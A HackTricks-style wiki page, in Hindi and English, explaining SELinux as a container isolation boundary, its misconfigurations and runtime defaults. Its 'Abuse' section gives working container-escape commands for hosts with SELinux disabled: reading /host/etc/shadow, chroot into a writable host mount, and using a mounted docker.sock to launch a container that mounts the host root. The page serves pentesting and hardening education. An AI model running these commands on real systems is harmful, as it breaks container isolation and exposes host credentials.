# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

SELinux एक **label-based Mandatory Access Control** system है। प्रत्येक प्रासंगिक process और object के साथ एक security context जुड़ा हो सकता है, और policy तय करती है कि कौन-से domains, कौन-से types के साथ और किस तरीके से interact कर सकते हैं। Containerized environments में आमतौर पर इसका अर्थ होता है कि runtime, container process को एक confined container domain के अंतर्गत launch करता है और container content को corresponding types के साथ label करता है। यदि policy सही तरीके से काम कर रही हो, तो process उन चीज़ों को read और write कर सकता है जिन्हें उसका label access करने के लिए अपेक्षित है, जबकि अन्य host content तक access से deny किया जाता है, भले ही वह content किसी mount के माध्यम से visible हो जाए।

यह mainstream Linux container deployments में उपलब्ध सबसे शक्तिशाली host-side protections में से एक है। यह Fedora, RHEL, CentOS Stream, OpenShift और अन्य SELinux-centric ecosystems पर विशेष रूप से महत्वपूर्ण है। इन environments में SELinux को नज़रअंदाज़ करने वाला reviewer अक्सर यह गलत समझेगा कि host compromise का स्पष्ट दिखाई देने वाला path वास्तव में blocked क्यों है।

## AppArmor Vs SELinux

High-level स्तर पर सबसे आसान अंतर यह है कि AppArmor path-based है, जबकि SELinux **label-based** है। इसका container security पर बड़ा प्रभाव पड़ता है। यदि वही host content किसी unexpected mount path के अंतर्गत visible हो जाए, तो path-based policy अलग तरीके से behave कर सकती है। इसके विपरीत, label-based policy यह देखती है कि object का label क्या है और process domain उस पर क्या कर सकता है। इससे SELinux simple नहीं बनता, लेकिन यह path-trick assumptions की उस class के विरुद्ध robust बनता है जिन्हें defenders कभी-कभी AppArmor-based systems में अनजाने में बना लेते हैं।

क्योंकि यह model label-oriented है, इसलिए container volume handling और relabeling decisions security-critical हैं। यदि runtime या operator "make mounts work" करने के लिए labels को बहुत व्यापक रूप से बदल देता है, तो workload को contain करने वाली policy boundary अपेक्षा से कहीं अधिक कमजोर हो सकती है।

## Lab

यह देखने के लिए कि host पर SELinux active है या नहीं:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Host पर मौजूदा labels का निरीक्षण करने के लिए:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
सामान्य run की तुलना labeling disabled वाले run से करने के लिए:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
SELinux-enabled host पर, यह एक बहुत practical demonstration है क्योंकि यह अपेक्षित container domain के अंतर्गत चल रहे workload और उस enforcement layer से stripped workload के बीच का अंतर दिखाता है।

## Runtime Usage

Podman उन systems पर SELinux के साथ विशेष रूप से अच्छी तरह aligned है जहाँ SELinux platform default का हिस्सा है। Rootless Podman plus SELinux सबसे मजबूत mainstream container baselines में से एक है क्योंकि process host side पर पहले से unprivileged होता है और फिर भी MAC policy द्वारा confined रहता है। Docker भी supported होने पर SELinux का उपयोग कर सकता है, हालांकि administrators कभी-कभी volume-labeling friction से बचने के लिए इसे disable कर देते हैं। CRI-O और OpenShift अपनी container isolation story के हिस्से के रूप में SELinux पर काफी निर्भर करते हैं। Kubernetes SELinux-related settings भी expose कर सकता है, लेकिन उनका value स्पष्ट रूप से इस बात पर निर्भर करता है कि node OS वास्तव में SELinux को support और enforce करता है या नहीं।<sup>[[2]](#references)</sup>

बार-बार सामने आने वाला lesson यह है कि SELinux कोई optional garnish नहीं है। जिन ecosystems को इसके आसपास बनाया गया है, वहाँ यह expected security boundary का हिस्सा है।

## Misconfigurations

Classic mistake `label=disable` है। Operationally, ऐसा अक्सर इसलिए होता है क्योंकि volume mount को deny कर दिया गया और labeling model को ठीक करने के बजाय SELinux को equation से हटाना सबसे तेज short-term answer लगा।<sup>[[1]](#references)</sup> एक अन्य common mistake host content का incorrect relabeling है। Broad relabel operations application को काम करा सकते हैं, लेकिन वे container को touch करने की अनुमति वाली चीजों का दायरा original intent से कहीं अधिक बढ़ा सकते हैं।

**installed** SELinux और **effective** SELinux को confuse न करना भी महत्वपूर्ण है। कोई host SELinux को support कर सकता है और फिर भी permissive mode में हो सकता है, या runtime workload को expected domain के अंतर्गत launch नहीं कर रहा हो सकता है। ऐसे मामलों में protection documentation से दिखाई देने वाली अपेक्षा की तुलना में काफी कमजोर होती है।

## Abuse

जब SELinux absent, permissive, या workload के लिए broadly disabled हो, तो host-mounted paths का abuse करना काफी आसान हो जाता है। वही bind mount, जो अन्यथा labels द्वारा constrained होता, host data तक पहुँचने या host modification का direct avenue बन सकता है। यह विशेष रूप से तब relevant होता है जब writable volume mounts, container runtime directories, या convenience के लिए sensitive host paths expose करने वाले operational shortcuts के साथ combine किया जाए।

SELinux अक्सर यह समझाता है कि generic breakout writeup एक host पर तुरंत काम क्यों करता है, लेकिन दूसरे host पर बार-बार fail क्यों होता है, भले ही runtime flags समान दिखाई दें। Missing ingredient अक्सर कोई namespace या capability नहीं, बल्कि एक label boundary होती है जो intact रही।

सबसे तेज practical check active context की तुलना करना और फिर उन mounted host paths या runtime directories को probe करना है जो सामान्यतः label-confined होते हैं:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
यदि host bind mount मौजूद है और SELinux labeling को disabled या कमजोर किया गया है, तो अक्सर information disclosure पहले होता है:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
यदि mount writable है और kernel के दृष्टिकोण से container प्रभावी रूप से host-root है, तो अगला कदम अनुमान लगाने के बजाय नियंत्रित host modification का परीक्षण करना है:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
SELinux-capable hosts पर runtime state directories के आसपास labels खो जाने से direct privilege-escalation paths भी उजागर हो सकते हैं:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
ये commands किसी full escape chain का replacement नहीं हैं, लेकिन ये बहुत जल्दी स्पष्ट कर देते हैं कि host data access या host-side file modification को रोकने वाला कारण SELinux था या नहीं।

### पूर्ण उदाहरण: SELinux Disabled + Writable Host Mount

यदि SELinux labeling disabled है और host filesystem को `/host` पर writable तरीके से mount किया गया है, तो एक full host escape एक सामान्य bind-mount abuse case बन जाता है:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
यदि `chroot` सफल होता है, तो container process अब host filesystem से संचालित हो रही है:
```bash
id
hostname
cat /etc/passwd | tail
```
### पूर्ण उदाहरण: SELinux Disabled + Runtime Directory

यदि labels disabled होने के बाद workload किसी runtime socket तक पहुँच सकता है, तो escape को runtime को सौंपा जा सकता है:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
प्रासंगिक observation यह है कि SELinux अक्सर वह control था जो ठीक इसी प्रकार के host-path या runtime-state access को रोकता था।

## Checks

SELinux checks का लक्ष्य यह पुष्टि करना है कि SELinux enabled है, वर्तमान security context की पहचान करना है, और यह देखना है कि जिन files या paths की आपको परवाह है, वे वास्तव में label-confined हैं या नहीं।
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
यहाँ क्या महत्वपूर्ण है:

- `getenforce` को आदर्श रूप से `Enforcing` लौटाना चाहिए; `Permissive` या `Disabled` पूरे SELinux section के अर्थ को बदल देता है।
- यदि current process context असामान्य या बहुत व्यापक दिखाई देता है, तो workload इच्छित container policy के अंतर्गत नहीं चल रहा हो सकता है।
- यदि host-mounted files या runtime directories पर ऐसे labels हैं, जिन तक process की पहुँच बहुत अधिक है, तो bind mounts कहीं अधिक खतरनाक बन जाते हैं।

SELinux-capable platform पर किसी container की समीक्षा करते समय labeling को secondary detail न समझें। कई मामलों में यह उन मुख्य कारणों में से एक होता है कि host पहले से compromised क्यों नहीं है।

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Host-dependent | SELinux separation, SELinux-enabled hosts पर उपलब्ध होती है, लेकिन सटीक behavior host/daemon configuration पर निर्भर करता है | `--security-opt label=disable`, bind mounts की broad relabeling, `--privileged` |
| Podman | SELinux hosts पर आमतौर पर enabled | SELinux systems पर Podman का सामान्य हिस्सा SELinux separation है, जब तक इसे disabled न किया जाए | `--security-opt label=disable`, `containers.conf` में `label=false`, `--privileged` |
| Kubernetes | Pod level पर सामान्यतः automatically assigned नहीं | SELinux support मौजूद है, लेकिन Pods को आमतौर पर `securityContext.seLinuxOptions` या platform-specific defaults की आवश्यकता होती है; runtime और node support भी आवश्यक हैं | कमजोर या broad `seLinuxOptions`, permissive/disabled nodes पर चलाना, labeling को disabled करने वाली platform policies |
| CRI-O / OpenShift style deployments | आमतौर पर heavily relied upon | इन environments में SELinux अक्सर node isolation model का core हिस्सा होता है | ऐसी custom policies जो access को अत्यधिक broad कर दें, compatibility के लिए labeling को disabled करना |

SELinux defaults, seccomp defaults की तुलना में अधिक distribution-dependent होते हैं। Fedora/RHEL/OpenShift-style systems पर SELinux अक्सर isolation model का central हिस्सा होता है। Non-SELinux systems पर यह पूरी तरह absent होता है।

## References

- [1] [Podman Documentation: --security-opt=option (label=disable)](https://docs.podman.io/en/v4.6.0/markdown/options/security-opt.html)
- [2] [Kubernetes: Configure a Security Context for a Pod or Container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

{{#include ../../../../banners/hacktricks-training.md}}
